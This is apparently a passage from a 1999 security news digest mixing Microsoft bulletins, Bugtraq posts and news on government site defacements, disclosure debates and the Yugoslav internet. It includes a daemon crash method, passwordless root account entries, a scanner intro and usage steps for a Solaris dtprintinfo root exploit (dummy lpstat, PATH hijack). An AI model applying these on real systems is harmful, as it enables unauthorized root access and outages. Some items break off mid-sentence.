      that the tools do not restrict which files a web site visitor can view.
      
      
      It is important to note several important points:
      - These file viewers are not installed by default under IIS.
         They are only installed under IIS if the user chooses to install
         the sample web files.
      - This vulnerability only allows a web site visitor to view files.
         There is no capability through this vulnerability to change files
         or add files to the server.
      - This vulnerability does not in any way bypass the Windows NT file
         permission ACLs. A web site visitor could only use these tools to
         view files whose ACLs allows them read access. The administrator of
         the web server determines the specific permissions for all files on
         the server.
      - The viewers can only be used to view files on the same disk partition
         as the currently-displayed web page. Databases such as those used by
         e-commerce servers are typically stored on a different physical drive,
         and these would not be at risk
      - The web site visitor would need to know or guess the name of each file
         they wished to view.
      
      
      Specific steps that customers can take to immediately eliminate the
      vulnerability are discussed below in What Customers Should Do. In addition,
      Microsoft is developing updated versions of the file viewers and will
      release them shortly.
      
      
      While there are no reports of customers being adversely affected by this
      vulnerability, Microsoft is proactively releasing this bulletin to allow
      customers to take appropriate action to protect themselves against it.
      
      
      Affected Software Versions
      ==========================
      - Microsoft Site Server 3.0, which is included with Microsoft Site
         Server 3.0 Commerce Edition, Microsoft Commercial Internet
         System 2.0, and Microsoft BackOffice Server 4.0 and 4.5
      - Microsoft Internet Information Server 4.0
      
      
      What Microsoft is Doing
      =======================
      Microsoft has provided this bulletin to inform customers of specific steps
      that they can take to immediately eliminate this vulnerability on their
      servers. Microsoft is developing updated file viewers that fix the problem
      identified, and will release an updated version of this bulletin when they
      are available.

         Knowledge Base.)
      
      
      What Customers Should Do
      ========================
      Customers should take the following steps to eliminate the vulnerability on
      their web servers:
      - Unless the affected file viewers are specifically required on the
         web site, they should be removed. The following file viewers are
         affected: ViewCode.asp, ShowCode.asp, CodeBrws.asp and Winmsdp.exe.
         Depending on the specific installation, not all of these files may
         be present on a server. Likewise, there may be multiple copies of
         some files, so customers should do a full search of their servers
         to locate all copies.
      - In accordance with standard security guidelines, file permissions
         should always be set to enable web visitors to access only the files
         they need, and no others. Moreover, files that are needed by web
         visitors should provide the least privilege needed; for example,
         files that web visitors need to be able to read but not write should
         be set to read-only.
      - As a general rule, sample files and vroots should always be deleted
         from a web server prior to putting it into production. If they are
         needed, file access permissions should be used to regulate access to
         them as appropriate

      Hi,
      
      
         iParty, by Intel Experimental Technologies Department, (unofficial
      information source at http://www.bumpkinland.com/iparty/), is a small voice
      conferencing program, which includes a server daemon in the download. It is
      handy for quick internet voice chat, but the server can be killed by sending
      a large amount of extended characters to the server port, which is 6004 by
      default, without being logged. The daemon either crashes quietly or GPF
      (varies from box to box).
         I've been told an advisory of some sort has already been released for
      this particular vulnerability but I believe the matter needs further
      attention because:
      
      
      1. While there are other newer and better voice conferencing programs out,
      iParty continues to be widely used.
      2. This vulnerability may be worse than thought: I tested my program
      (attached to message) against 4 random Windows 95/98 boxes with the daemon
      running, and after 2 or 3 crashes in a row, on top of crashing the iParty
      daemon, some experienced disconnection from the internet, ICQ and/or
      Rnaapp.exe, and one was even forced to reboot after the Rnaapp.exe crash.
      
      
      Thanks,
      Ka-wh00t

 18.0 Microsoft Security Advisory Bulletin: Excel 97 virus patch (MS99-14)
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      The following is a Security  Bulletin from the Microsoft Product Security
      Notification Service.

      Summary
      =======
      Microsoft has released a patch that eliminates vulnerabilities in the Excel
      97 virus warning mechanism. The patch is fully supported, and Microsoft
      recommends that affected customers download and install it, if appropriate.
      
      
      Issue
      =====
      Microsoft Excel 97 provides a feature that warns the user before launching
      an external file that could potentially contain a virus or other malicious
      software. This feature allows the user to weigh the risk of opening the
      file, based on its origin, the network it is located on and the security
      practices in operation there, the sensitivity of the data on the user's
      computer, and other factors.
      
      
      However, certain scenarios have been identified that could be misused to
      bypass the warning mechanism. In general, they require the use of
      infrequently-combined features and commands, and are unlikely to be
      encountered in normal use. This patch addresses these issues so that they
      cannot be taken advantage of by a malicious user.
      
      
      While there are no reports of customers being adversely affected by any of
      the vulnerabilities eliminated by the patch, Microsoft is proactively
      releasing the patch to allow customers to take appropriate action to protect
      themselves against it. These fixes are already built into Excel 2000 and
      users of that product will not need to download this patch.

 19.0 LISA install leaves root access: Openlinux 2.2

      Hello,
      
      
      I believe I've found a bug in the installation process of OpenLinux 2.2
      when using the LISA boot disk. During the installation a temporary passwd
      file is put on the new file system containing the user "help" set uid=0
      gid=0 and no password. Once you are prompted to set the root password and
      default user password a new passwd and shadow file is created yet the help
      user is left in the shadow file with, you guessed it, no password... Here
      are the offending entries:
      
      
      /etc/passwd
              help:x:0:0:install help user:/:/bin/bash
      
      
      /etc/shadow
              help::10709:0:365:7:7::
      
      
      Anyone who installed OpenLinux 2.2 using the LISA boot disk should check
      their password file now ;-)
      
      
      I found this using a cdrom I made from a mirror of the mirror at
      ftp.tux.org. Just to make sure I wasn't mixed up I redownloaded the
      install.144 file from ftp.calderasystems.com and tried again. Same thing.
      The install disk is version 137 dated 26Mar99 (displayed on the boot
      message).
      
      
      I wrote Caldera a message late in the day Friday regarding this bug but
      haven't heard back from anyone. I've tried to resist posting this until I
      hear back but I really feel people should know now!!
      
      
      PS: I'm not sure if Lizard, the graphical installation method, has this
      problem. It crashes before it does much here.... that's why I tried LISA.
      
      
      Thanks,

      The SANS Institute (http://www.sans.org/) has graciously given Bugtraq
      a plaque during the SANS conference now happening at Baltimore for being
      one of the three most valuable security publications. This is in response
      to a survey the did at an earlier conference. I'd like to thank SANS
      for the gesture. Although I accepted the plaque it is really for all of
      you. Cheers.

      they also donated a sizable chunk of money for a mail server upgrade as
      part of the same award. This donation, combined with other donations from

      White House Takes Server Offline 


      contributed by Weld Pond 
      In order to conduct an "Admistrative Review" the White House took its web server offline and
      also closed off all e-mail to and from the outside world. This comes after what HNN believes 
      to be a successful crack of the www1. server at 8:50am EST Monday morning. This crack was 
      _not_ related to other recent .gov/.mil cracks nor was this crack strongly related to the
      Chinese embassy bombing or had any other political motives. Other mainstream news outlets
      are getting their stories confused. (If you only read one of these articles I recommend the
      one by Brock Meeks of MSNBC, it seems to be the most thorough.)

      White House Web site shut down
      Purported attacker says there was no political motive
      By Brock N. Meeks and Alan Boyle
      MSNBC

      WASHINGTON, May 11 The White House shut down its public Web site for more than 24 hours
      because of computer attacks, a spokesman said Tuesday. Government Web sites have sustained
      a wave of assaults apparently aimed at protesting last weekÆs NATO bombing of the Chinese
      Embassy in Belgrade. However, in an interview with MSNBC, a computer user who claimed a
      role in the White House Web break-in denied that there was a political motive.
               
      AN ATTEMPT was made to break into the system that operates the Web page yesterday morning,
      White House spokesman Barry Toiv told MSNBC Tuesday, and so what weÆve done is use existing
      procedures to limit access to the system so we could make a full assessment.The Web site was
      back in operation by Wednesday morning.
                                
       Computer attacks on government Web sites have taken on a higher profile in the wake of FridayÆs
      embassy bombing, which left three dead and 20 injured. The bombing, which NATO said was due to an 
      intelligence error, sparked a wave of demonstrations at the U.S. Embassy in Beijing, as well as 
      widespread criticism online and offline.
                               
       A variety of federal sites have been defaced by political protesters. But the primary motivation
      behind the attack on the White House site was merely to show that it could be done, a teen-ager who
      said he was involved in the attack told MSNBC.
                                
       A telephone conversation with the 18-year-old was arranged by a mutually trusted intermediary. The 
     teen, who claimed to be a member of the group known as gH or Global Hell, spoke on the condition that
     neither his real name nor his hacker nickname would be published. To back up his claim, he provided 
     internal user logs listing White House staff. His account also was consistent with other reports 
     provided by trusted third parties.
                                
     `JUST LUCKÆ
      
       The teen said the White House Web break-in was actually just luck. Members of gH caught the White
     House system administrator transferring log files in an insecure manner via an unsecured FTP site that 
     was snooped out from another box (computer), he told MSNBC.
                                
       I have no idea why they would do that Whoever that admin was, he didnÆt know what he was doing, he
     said. Along with gH, a group calling itself the Hong Kong Danger Duo took part in the White House hack,
     the teen said.
              
       He said the White House hack lasted for only a few minutes, due to what is known as a crontab, a timed
     command set by the system administrator. This command automatically refreshes the entire site with identical
     content from a secure server to help guard against the kind of attack that took place Monday.
                                
     OTHER DEPARTMENTS HIT
     
       Government sources told NBC News that attackers also hit the Web servers for the departments of Energy,
     Interior and Labor, as well as the U.S. Information AgencyÆs Web site. All those Web sites were in service
     Tuesday afternoon, although traffic to the Energy DepartmentÆs Web site was redirected to a numerical
     Internet address. 
      
       The sources said the intruders left behind cyber-graffiti slogans saying, for example, You bombed the 
     Chinese Embassy, this is what youÆre going to get. Some of the graffiti was in Chinese characters, the
     sources said.
     
       In all cases, the Web computer servers contained only publicly available information, and no classified 
     information was compromised, officials emphasized.
     
       The politically motivated attacks on departmental Web sites appear to be unrelated to the White House attacks.
     The teen from gH said he had no idea who carried out the other computer attacks, an assertion that meshed with 
     other reports.
           
       Several hacker-oriented sites  including AntiOnline as well as Hacker News Network and Attrition.Org 
     posted what they said were copies of the White House hack. A message hidden inside the source code for the page
     reads: You found my elite hidden source. Wow. Ok, no real msg here. Stop all the war, no point for it. This box
     wasnÆt ever secure.
                        
       Brian Martin, who runs the Attrition.Org site, said the stop all the war reference doesnÆt mean the attack was
     launched with politics in mind.A lot of hackers will do that to kind of justify what they are doing, Martin said.
     They hacked this site because they could, he said. They saw a window of opportunity and took it.
     The White House site is operated under contract by PSINet of Herndon, Va.

      Agencies lay groundwork for intrusion-detection
      network

      BY DIANE FRANK (dfrank@fcw.com)

      A group of federal agencies has completed the initial model of a
      governmentwide intrusion-detection network that will provide a common
      center for response to cyberattacks on agencies.

      The Federal Intrusion Detection Network (FIDNET) is in the very early
      stages of development, and the group of federal agencies heading the
      development effort recently agreed on possible agency responsibilities and a
      reporting structure, said Tom Burke, assistant commissioner of information
      security at the General Services Administration's Federal Technology Service,
      today at the Outlook 2000 conference in Falls Church, Va.

      GSA, the Critical Infrastructure Assurance Office, the National Security
      Agency and the FBI's National Infrastructure Protection Center are all
      developing FIDNET as part of President Clinton's directive to protect the
      nation's mission-critical systems. The system is intended to provide all
      agencies with intrusion-detection systems that will allow agencies to locate
      incidents across the government as soon as they occur. It also will serve as a
      center for analysis of intrusions or attacks.

      The system will be made of three main blocks, with the civilian agencies
      reporting to the Defense and intelligence agencies and possibly a full-time
      program management office overseeing the whole system. FIDNET is based
      on the Defense Department's incident-reporting network, which is much
      further along than the efforts in the civilian agencies. "We're looking to
      leverage the work that has already been done at Air Force and DOD so we
      don't duplicate their effort," Burke said.

      The blocks eventually will include a similar network being developed in the
      private sector and the Federal Computer Incident Response Capability center
      at GSA, Burke said.

      Hackers retaliate after NATO bombing

      BY BRAD BASS (brad_bass@fcw.com)

      A group of Chinese hackers defaced the home pages of the departments of
      Energy and Interior this past weekend, apparently in retaliation for NATO's
      accidental bombing of the Chinese embassy in Belgrade.

      The hackers claimed their motives were not political but were a response to
      the death of Chinese journalists resulting from NATO's attack. The messages
      were written in Chinese and English.

      The hackers referred to the bombing as a "Nazi action" and urged NATO,
      and specifically the United States, to accept responsibility. "You have owed
      [sic] Chinese people a bloody debt which you must pay for," said a message
      on the DOE Web site on Sunday afternoon. "We won't stop attacking until the
      war stops!"

      A spokesman for iDefense, an information clearinghouse on critical
      infrastructure protection, said the attack probably did little harm but
      characterized it as "a warning sign" to the government.

      "It's just another sign that these types of things are easy to accomplish if you
      have a modem and a little technical knowledge," the spokesman said. "It's not
      too far removed from taking it to another more harmful level."

      Chinese attack embassy bombing on Net 
      By Reuters

      BEIJING--Chinese computer buffs flooded cyberspace with anti-U.S. rhetoric today,
      hacking into a U.S. embassy Web site and overloading chat rooms with condemnation of
      the NATO bombing in Yugoslavia.
      
      As angry protesters hit the pavement in a more traditional form of outrage, hurling 
      whatever came to hand at the U.S. and British embassies in Beijing, China's wired
      elite logged on to vent their anger.
      
      More than 24,000 protest messages have been posted on one popular chatroom at Netease.com
      since three NATO missiles slammed into the Chinese embassy compound in Belgrade Friday night,
      killing three journalists and injuring more than 20 people.
      
      Most of the postings were one-line invectives against President Clinton or the NATO bombing
      campaign in Yugoslavia. But others focused on ways to retaliate for the strike.
      
      "Our strongest weapon is for the masses to begin a campaign to boycott American goods," wrote
      one user. "This is what the Americans are most scared of.Americans love money and they listen
      the most to taxpayers. If they lose economic gains then they lose the essentials."
      
      Another user, writing under the name "KILL-USA," called on China to make use of the situation
      to push for entry into the World Trade Organization.
      
      One urged his counterparts to pirate U.S. software to cripple the American economy.
      
      Others condemned students and workers who had attacked foreign journalists covering violent 
      protests outside the U.S. embassy over the weekend.
      
      "The anger in our hearts must not lead us to lose reason and curse and beat foreigners when we
      see them," wrote a user called Chinese Kung Fu.
      
      The outpouring of angst on the Web was so great that many of China's most popular sites added
      additional servers to keep up with the demand.
      
      The popular Sohu.com also set up a special site to gather responses to the attack on the Chinese
      embassy and was receiving one response every second earlier
      today.
      
      In addition to the Web postings, Chinese hackers twice assailed the U.S. embassy Web site, 
      replacing the home page with text reading "down with barbarians," the state-run China Daily reported.
      
      Today the Web site could be accessed through an American server, but the Chinese route was blocked.
      
      Word of the bombing spread rapidly on the Internet--in contrast to the many hours the official media
      took to report it--and many students said they first heard about street protests in Beijing on the Web.
      
      More than 2 million Chinese use the Internet, one of the only forums of expression free from government
      oversight.

      Full Disclosure - The Only Way to Be Sure 


      contributed by remage 
      A rather interesting rant has been posted by L0pht Heavy Industries, Inc. The rant covers 
      the issue of Full Disclosure which has been argued about and argued about. In the wake of 
      the recent showcode-Webtrends-L0pht-Microsoft advisory the L0pht makes a very convincing 
      argument that Full Disclosure is the only way to protect those who are
      vulnerable. 

      L0pht Heavy Industries, Inc.
      http://www.l0pht.com/
      
      05.10.1999 
      There is a new trend in the reporting of security vulnerabilities
      these days. Many of the problems are being reported by companies
      that make products to detect these problems. While more people
      researching the security of products is a good thing, it is certainly
      having an effect on the free flow of security information.
      Sometimes this effect is to the detriment of the customers of the
      product that the flaw exists in. 

      If a company makes a product that scans for security problems,
      they are going to want to add their newly discovered vulnerability
      to their list of things to scan for. They are probably, depending on
      the seriousness of the problem they have uncovered, going to want
      to make the advisory of the problem into a full scale press release
      that will hype their product. Usually the press release won't really
      tell you how to find the problem or how to solve it. You are going to
      need to download their product for that. 

      When security problems exist on production servers accessible from
      the internet, time is critical. Every day that goes by is another day
      that the server is exposed. How many people know about the
      problem? Who is actively exploiting it? It is impossible to tell. Good
      ethical security practice is to tell the people effected quickly,
      especially if there are steps they can take to mitigate or eliminate
      the risk themselves. 

      The L0pht recently found a problem with Microsoft's IIS 4.0 web
      server, the showcode problem. It allowed web users to read files
      anywhere on the web server that the file permissions were set to
      be world-readable. This turns out to be the case in many web
      servers that are not locked down properly. The L0pht was surprised
      at how widespread the problem was. Many high profile e-commerce
      servers were effected. Many, many corporate web servers were
      effected. 

      The research of the problem, which took less than a day, came up
      with a simple solution. Delete the sample files which made the
      machine vulnerable. They don't need to be on production servers
      anyway. We crafted an advisory and gave out the solution. 

      When we reported this to Microsoft they said that they had known
      about the problem for "several weeks". They had been notified by
      WebTrends about the problem, were researching it, and would issue
      a Security Bulletin. It didn't seem to be that so complicated an
      issue that would take several weeks to research. And the fix was
      simple. Just delete the files. No need to download a hotfix or even
      tweak the registry. What was taking so long? 

      The L0pht released the showcode advisory to Bugtraq, computer
      industry reporters, and Microsoft on May 7, 1999, 9:30am EST.
      Later that day, approximately 1:40 pm EST, WebTrends released a
      press release about the same problem. It spoke of how WebTrends
      had discovered the problem. The WebTrends press release didn't
      tell how to detect the problem and had no solution to the problem.
      Two things that were present in the L0pht advisory. It seemed that
      you had to download and run their product if you wanted this
      information. 

      It makes one wonder if the press release was put out at that
      particular time because the L0pht had informed the public about the
      problem first. It makes one wonder why Microsoft kept this problem
      and easy solution to themselves for several weeks. 

      Many crackers keep security vulnerabilities secret so that they can
      exploit them without worrying about vendor patches or fixes by
      system administrators. This is looked down upon highly by the
      security community as totally unethical. Why keep the
      vulnerabilities secret unless you are going to exploit them, or
      perhaps trade them for something? 

      Now we have software vendors keeping things secret. At least
      secret for a substantial period of time. Is this the way we want the
      industry to behave? 

      This is why full disclosure mailing lists such as Bugtraq and web
      sites such as Packet Storm Security are so important. They allow
      customers to get vulnerability reports, and hopefully fixes, in a
      timely manner. There is no centralized clearinghouse such as the
      software vendor or some government agency to slow things up for
      their own ends. 

      Vulnerability information is extremely valuable both to attackers and
      customers. Companies and organizations that release this
      information openly and as soon as possible are doing the security
      community a service. Those who choose to use the information for
      their own purposes first put customers at risk.

      Cure for CIH Found 


      contributed by Scores 
      A student in Bangladesh claims to have found a cure for the CIH or Chernobyl virus that wipes out thousands of
      systems world wide last month. Monirul Islam Sharif, an undergraduate computer science student claims that a
      70K-byte C language program he has named MRECOVER will recover the FAT table and the first partition of a
      FAT16 table.

      Student touts 'Chernobyl' cure
      By Sanjit Singh


      NEW DELHI -- One student invented it, but another has written an antidote to help users who lost data to the CIH
      computer virus. 

      The Chernobyl virus, also known as CIH, was invented by onetime Taiwanese student Chen Ing-hau and
      caused havoc all over Asia April 26, infecting thousands of PCs in South Korea, Singapore, India, Bangladesh
      and China. (Most major U.S. corporations with updated antivirus software escaped serious damage.) But it now
      has a cure, courtesy of Monirul Islam Sharif, an undergraduate computer science student at Dhaka
      University in Bangladesh. 

      Sharif, 21, said he wrote the 70K-byte C language program, which he called MRECOVER, in 24 hours. 

      "I started working on it on April 27, when a friend brought his infected hard drive to me, and by the next day, it
      worked when I tried it out. Most of the data on the disk was recovered," he said. 

      Sharif tried it on several other computers at Dhaka, and it worked there, too, recovering data in minutes. 

      "If your machine uses FAT [File Allocation Table], MRECOVER will recover all the data on the disk within
      three to four minutes. But if your computer uses FAT 16, then it will recover all data after the first partition, 
      limiting the recovery to between 40 and 60 percent," Sharif said. He added that the antidote doesn't work on hard 
      drives with a capacity of 8G bytes or more. 

      The program is free to use and has been posted on the Web at http://members.xoom.com/monirdomain for
      anybody who wants to download it. A new and improved version for machines that use FAT 16 will be ready
      within days and followed by one for large-capacity hard drives. Sharif said he has received 3,000 hits and
      innumerable e-mail messages since he put MRECOVER on the Internet May 5, but the inventor
      doesn't see any commercial gain from the program.  

      Sharif, who was born in England and spent his early childhood there, graduates next June. He said his
      ambition is to head to the U.S. for higher studies. 

      "I would like to go to the U.S. to do a master's in computer science. But it's unlikely that I will specialize in
      antivirus programs. I still find general programming much more interesting," he said.

      It looks like Yugoslavia's Internet users will be offline for a long time. As stated on
      www.beograd.com "We have reliable information that the US Government ordered
      shut down of satellite feeds for Internet customers in Yugoslavia, as a result of NATO
      air war against this country. This action might be taken as soon as later tonight or

      release
     
      BELGRADE, MAY 12 - We have reliable information
      that the US Government ordered shut down of satellite
      feeds for Internet customers in Yugoslavia, as a result
      of NATO air war against this country. 
      This action might be taken as soon as later tonight or
      tomorrow (May 12 or 13, 1999).
     
      This is a flagrant violation of commercial contracts
      with Yugoslav ISPs, as well as an attack on freedom of
      the Internet.
     
      A Web site in protest of these actions should be up
      shortly. We will supply you with the URL. In the
      meantime, please be so kind to inform as many people
      as possible about this tragic event for the Internet
      community in Yugoslavia and Europe.

      From Beograd.com:


      16:50 According to the last information, "LORAL ORION" has given up, until further notice, 
      disconnecting Yugoslavia from Internet, because of the protests from all around the world 
      that followed the announcement


      15:55 FONET - One of the biggest US communication satellites of the firm  "LORAL ORION" has
      informed Belgrade provider "Informatika" last night that because of "vis major" they wiould
      have to stop Internet emitting toward all Yugoslav providers who are linked to providers 
      in USA. "This decision is the result of the executive order of the President of USA, Bill
      Clinton, banning emitting of all services from USA into Federal Republic of Yugoslavia 
      (Serbia and Monte Negro)", says the message of "LORAL ORION" to the general Director of 
      "Informatika", Slobodan Sreckovic. "In accordance with that, LORAL ORION will, starting from
      May 12, 1999, stop   its services", it is said at the end of the statement. On Thursday, May 13,
      in morning hours, "Informatika" confirmed to Fonet this has not
      happened yet, but they are expecting to be disconnected from USA Internet satellite service toward
      Yugoslavia any minute/hour now".

      Clinton Deciding Whether to Cut Yugoslavia Internet Access

      It makes me wonder how are private companies going to be able to secure global business if underneath

      FoxNews;
      
      Clinton Deciding Whether to Cut 
      Yugoslavia Internet Access 
      8.08 a.m. ET (1208 GMT) May 14, 1999 
      
      
      WASHINGTON  Confronted with a dilemma of war in the information age, the Clinton administration is trying to
      decide whether its trade embargo extends to Internet access for some of Yugoslavia's citizens. 
      
      Loral Space and Communications Ltd. of New York said it may be forced to cut transmissions into Yugoslavia from
      one of its satellites, which serves at least two of the country's major Internet providers. 
      
      "We're still not clear on this whole thing," said Jeannette Colnan, a spokeswoman for Loral Space. 
      
      President Clinton issued an executive order two weeks ago banning U.S. companies from selling or supplying to
      Yugoslavia "any goods, software, technology or services," although the order allows for the "special consideration of
      the humanitarian needs of refugees." 
      
      The National Security Council said information services are generally considered exempt from trade embargoes, but that
      electronic commerce is affected. The Internet performs both functions. 
      
      "We'll need to inquire further about the appropriate applications of the law," said David Leavy, a spokesman for
      the security council. 
      
      Loral Space said Thursday that it was discussing its obligations under the embargo with the Treasury
      Department, which didn't respond to requests for comment. 
      
      Experts said any move by the United States to limit civilian use of the Internet would be unprecedented. 
      
      NATO has already attacked Serbian broadcast stations to stem what it describes as propaganda, and Serbs have
      established an extraordinary network on the Internet criticizing ongoing air strikes. 
      
      But the Internet also serves as a conduit for civilians to receive unadulterated news reports about NATO efforts. 
      
      "The Internet remains at this point one of the major sources inside Yugoslavia for
      objective news reporting about the war," said Jim Dempsey of the
      Washington-based Center for Democracy and Technology. 
      
      Word of the threat to shut down Internet access to at least parts of Yugoslavia
      spread quickly across the global network, where it was condemned in some e-mail
      messages and online discussion groups. 
      
      "To put it bluntly, we somehow got used to air-raid sirens, bombings and threats of
      invasion, but we don't know how we're going to survive without the Internet," said
      Alex Krstanovic, co-founder of Beonet, one of the Internet providers in Yugoslavia.
      
      But some argued that access should be cut off. 
      
      "Continuing to provide these services would be kind of like giving aid to the enemy,"
      one person wrote. 
      
      The possible loss of Internet access also illustrated the fragility of the computer
      network and the importance assigned to it internationally. 
      
      Computer traffic in Yugoslavia uses both satellite and traditional land-based
      telephone lines, but the loss of the Loral satellite could dramatically reduce the
      Internet bandwidth available to citizens there, causing slow connections or even
      blackouts. 
      
      Web sites reliant on the Loral satellite continued to be accessible overnight
      Thursday, and there were no substantiated reports of anyone unable to retrieve
      information from outside the country using the Internet. 
      
      A spokeswoman at the organization that registers Web addresses ending with the
      country's "yu" suffix said that she was familiar with the reports but that there had
      been no problems yet.

      The site is offering to "recycle" spam you send the site and submit it for complaint

      use to farm more e-mail accounts, spamrecycle.com is supported by the Coalition
      Against Unsolicited Commercial E-mail. 

      Spamrecycle.com officials said the site was created to help people fight spam. Many spam perpetrators
      give e-mail addresses that offer to remove the spam victim from further unsolicated email.
      Unfortunately, in many cases, the e-mail only validates the victim's e-mail address, causing more spam
      to pour in. 

      Spamrecycle.com is sponsored by CDnow.com, which is giving people who recycle their spam a $5

       Quickie Coldfusion exploit finder v1.0
      
       After seeing all the super lame hacks by groups desperatly seeking media wh0rage, like
       JPs new favorite group, Team spl0it, and all the lame crap they were using, I deciced
       to help them in their quest to look lame. Most of the 'tools' these people were
       releasing were nothing more then modified versions of my cgiscanner (cgiscan.c), so
       here is a newly coded, faster scanner for them to use and rip off. If I find this code,
       like the rest of my code, on JPs code site, with my name cleaverly removed, I am going
       to go take a shit on the hood of his car.
      
       This should also give McIntyre and Jericho some more sites to put in their hacked site
       archive on attrition.org that JP can rip off to. They have already shit on his car.
      
       This scanner scans an entire class C address, and does it with no bull. Enter the
       starting IP address, then the one you want to to stop on, and it will scan each box for
       the 3 parts of the bug.

      Hello.
      
      "dtprintinfo" is suid program, the stack buffer can be overflowed by '-p'
      option. I made an exploit program that can get root for Intel edition of
      Solaris2.6 and Solaris 2.7.
      Please test it.
      If you test this program, please set DISPLAY environment correctly
      before execution.

      Sorry, I forgot to to write the following things...
      
      Before execution of dtprintinfo exploit, please make a dummy
      lpstat command.
      
      for example,
      
      % cat > lpstat
      echo "system for lpprn: server.com"
      ^D
      % chmod 755 lpstat
      % setenv PATH .:$PATH
      % gcc ex_dtprintinfo.c
      % a.out
      
      
      Following exploit program is for Sparc Solaris.

      Net number system at a crossroads 
      By Dan Goodin and Courtney Macavinta
      Staff Writers, CNET News.com 
      NEWS.COM 
      May 12, 1999, 4 a.m. PT 
      URL: http://www.news.com/SpecialFeatures/0,5,36425,00.html 
      
      special feature Alongside the highly public debate over domain names, a little-understood predicament--with 
      more far-reaching consequences--is confronting the new nonprofit corporation in charge of the Net's 
      administration.
      
      Forget about ".com." The critical resource under the Net's hood is numerical addresses, and the Internet 
      Corporation for Assigned Names and Numbers now is in charge of those, too.
      
      Every online device or computer needs an Internet Protocol (IP) numerical address to connect to the global
      network. When the system was being designed, hardly anyone imagined that its 4.2 billion unique addresses 
      would ever be exhausted. Just a few decades later, however, some in the technical community fear that the rapid
      pace of innovation one day may cause the Net to run out of numbers.
      
      Demand for IP numbers is naturally growing due to the Net's evolution as a meeting place and marketplace. Further
      draining the IP pool is the aggressive rollout of "always on" cable Net access and the array of handheld devices 
      that need dedicated IP numbers.
      
      Currently, most online access providers and companies utilize a small batch of IP addresses by dynamically 
      assigning the numbers based on demand when people log on to their networks. But with broadband services such as
      cable, customers must have their own dedicated number.
      
      "It's going to come to the point where your TV remote is speaking IP to your TV, and they'll each need an IP 
      address," said Paul Vixie,
      an architect of the Net's address system. Under such a scenario, a typical household could have more than 250 IP
      addresses, he added.
      
      In a way the potential shortage of IP addresses is most analogous to the shortage of phone numbers that came about
      with the advent of fax machines and cellular phones, which has spurred the addition of new area codes. 
      
      And the perceived scarcity of addresses is just the beginning. As more computers connect to the Net, the databases
      that map the numbers are growing larger and becoming unwieldy. The ever-increasing size of the network's so-called
      routing tables has some Net programmers worried.
      
      "There's going to be a point when machines can't handle the size," said Kim Hubbard, president of the American 
      Registry for Internet Numbers, which is responsible for allocating and assigning IP addresses in the Americas. 
      
      Although there is hope that a new standard, IP version 6 (IPV6), could help alleviate both problems, the timeline for
      a rollout is sketchy--estimates range from the next 5 to 25 years. That's why many in the Net addressing trenches 
      agree that allocation of these precious resources must meet strict guidelines.
      
      "There is this constant tension about whose interest is being served," said Tony Rutkowski, principal consultant for
      the Next Generation Internet and a founder of the Internet Society. "It's a combination of how these IP addresses 
      are allocated and to whom--and that is the rub."
      
      New nonprofit in the middle
      And now ICANN, which is mediating a number of other contentious debates, finds itself in the middle of the 
      long-standing, international struggle over who should hold the key to the IP address treasure chest. 
      
      At a public meeting in Berlin later this month, ICANN is expected to take its most definitive step on the issue, 
      creating an organization to tackle IP addressing.
      
      Since last November, ICANN has been charged with overseeing the Net's technical administration, under a Memorandum Of
      Understanding it signed with the Commerce Department. ICANN also has been recognized by more than 25 nations in its new
      role.
      
      So far, ICANN's challenges posed by IP numbering have been overshadowed by other topics, such as authorizing new companies
      to register domains ending in ".com" or adding new top-level domains such as ".web" and ".firm." Along with the fact that
      domains have been a well-publicized issue, ICANN's leaders also don't see the IP address issue as terribly pressing.
      
      "We haven't needed to do anything in the way of [IP address] policy yet," said Michael Roberts, ICANN's interim chief 
      executive. "There is potential scarcity. The thing to do is get moving on IPV6, which will deploy in an open and fair way
      based on reasonable need." 
      
      But a failure to adequately tackle a range of problems surrounding IP addresses ultimately could cripple the Net. In fact,
      charting a new IP numbering course may prove to be ICANN's most important contribution.
      
      Chain of command gets longer In the past, policy and oversight of IP addresses has been left to the Internet Assigned Numbers
      Authority, the government-funded group that designed the numbering system under the leadership of the late Jon Postel. Under 
      ICANN, the Internet Assigned Numbers Authority still distributes address space to three geographically diverse Regional Internet
      Registries (RIRs), which typically hand out the addresses to large end users such as Internet service providers and universities.
      
      ICANN will be operating under the same bottom-line principles that have guided the Internet Assigned Numbers Authority for the 
      past three years. They call for a system that conserves addresses and routes Internet traffic more efficiently.   
      
      The Internet Assigned Numbers Authority's functions may still be in place, but the chain of command is set to be dramatically 
      altered. Whereas the buck used to stop at Postel, now it will stop at the ICANN board, which ultimately will be advised--and 
      elected--by many representatives in the Net community, including regular online users.
      
      Some veteran Netizens view the shift as necessary, but potentially problematic.
      
      "One of the advantages of [the Internet Assigned Numbers Authority]--and one of its 
      disadvantages--is that it rested with a single individual, and a single individual could
      easily make a decision," said Bill Manning, a staffer with the University of Southern 
      California's Information Sciences Institute, which housed the Internet Assigned Numbers 
      Authority and also was headed by Postel. "That nimbleness in being able to respond seems
      to be a necessary casualty in making [the] transition" to a privatized Internet.
      
      In keeping with its mission to turn over Net governance to the private sector, ICANN has
      proposed a model that establishes an address supporting organization (ASO), containing 
      stakeholders who will forge new policies concerning IP numbering. 
      
      At its Berlin meeting May 26, ICANN will vote on proposed bylaws for supporting organizations,
      including the ASO. The bylaws will set up an open membership consisting of IP address registries,
      ISPs, and end users. For a new policy to be enacted a majority of each membership category must 
      approve it.
      
      Election of the new organization comes at a critical juncture in the evolution of the Net's address
      system, experts say, and is almost certain to stoke the public scrutiny surrounding ICANN.
      
      "It's important that [the ASO] understand the technical issues involved and are not swayed by the
      political expediencies that have been pressed in the past," said David Conrad, founder of the Asia
      Pacific Network Information Center (APNIC), one of the three IP address registries.
      
      This sentiment is echoed by ISPs, another faction whose input will be vital to the ASO.
      
      "How this policy recommendation body is formed within ICANN is a concern," said Barbara Dooley, 
      president of ISP trade group the Commercial Internet Exchange.
      
      Numbers don't add up
      Not surprisingly, today's system is a far cry from the way things were done in the early days of the
      Net.
      
      Thirty years ago few architects of what was then called the Arpanet expected it to mushroom into a 
      medium that would change the way people live, work, and do business. IP addresses were viewed as an
      endless resource that was free for the taking. Out of that thinking came the practice of doling out
      wastefully large blocks of numbers to companies or groups that asked for them.
      
      Ford Motor, Eli Lilly, and Hewlett-Packard are just three of the holders of the largest "legacy" 
      blocks, known as Class A allocations, which contain more than 16.7 million addresses each. In 1995, 
      leading cable Net access provider @Home appealed to the Internet Assigned Numbers Authority after its
